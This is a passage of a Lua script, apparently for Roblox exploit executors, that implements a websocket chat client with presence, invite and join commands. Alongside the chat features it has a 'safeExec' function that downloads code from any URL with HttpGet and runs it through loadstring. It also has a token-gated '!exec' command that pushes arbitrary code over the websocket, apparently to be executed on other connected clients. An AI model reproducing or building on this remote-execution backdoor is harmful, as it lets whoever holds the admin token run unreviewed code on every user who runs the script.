    end
end

local function resolveName(partial)
    partial = partial:lower()
    for name, _ in pairs(onlineUsers) do
        if name:lower():sub(1, #partial) == partial then
            return name
        end
    end
    return nil
end

local function sendOnline()
    pcall(function()
        if ws then ws:Send("ONLINE|" .. player.Name) end
    end)
end

local function sendOffline()
    pcall(function()
        if ws then ws:Send("OFFLINE|" .. player.Name) end
    end)
end

local function safeExec(payload)
    if type(loadstring) ~= "function" then return end
    local code = payload
    if payload:match("^https?://") then
        local ok, res = pcall(function()
            return game:HttpGet(payload)
        end)
        if ok and type(res) == "string" then
            code = res
        else
            return
        end
    end
    local fn = loadstring(code)
    if type(fn) == "function" then
        pcall(fn)
    end
end

local function sendText(text)
    if text:sub(1, 5) == "!exec" then
        if ws then ws:Send("EXEC|" .. Config.ADMIN_TOKEN .. "|" .. text:sub(7)) end
        return
    end
    
    if text:sub(1, 7) == "!invite" then
        local partial = text:match("^!invite%s+(%S+)")
        if partial then
            local target = resolveName(partial)
            if target and ws then
                ws:Send("INVITE|" .. target .. "|" .. game.PlaceId .. "|" .. game.JobId)
            end
        end
        return
    end
    
    if text:sub(1, 5) == "!join" then
        local partial = text:match("^!join%s+(%S+)")
        if partial then
            local target = resolveName(partial)
            if target and ws then
                ws:Send("JOIN_REQUEST|" .. target .. "|" .. player.Name)
            end
        end
        return
    end
    
    createMessageBubble("You: " .. text, true, player.Name)
    if ws then ws:Send(player.Name .. "|" .. text) end
end

